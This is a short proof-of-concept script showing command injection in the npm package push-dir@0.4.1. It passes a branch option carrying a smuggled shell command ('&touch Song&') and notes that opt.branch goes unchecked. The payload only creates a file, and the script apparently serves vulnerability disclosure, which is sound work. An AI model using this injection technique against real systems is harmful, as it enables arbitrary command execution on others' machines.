/**
 * push-dir@0.4.1 is vulnerable to command injection.
 * To do this attack, we need to set up the environement first
 * To set up the environment, we need to do 
 * "git init"
 * "git add -A"
 * "git commit"
 * to clean the git status
 * Then we can run the code to do exploit
 *
 * The injection point is in line 139 of "index.js"
 * the variable opt.branch is not checked
 */

var root = require("push-dir");
var attack_code ="&touch Song&";
var opt = {"branch": attack_code};
root(opt);
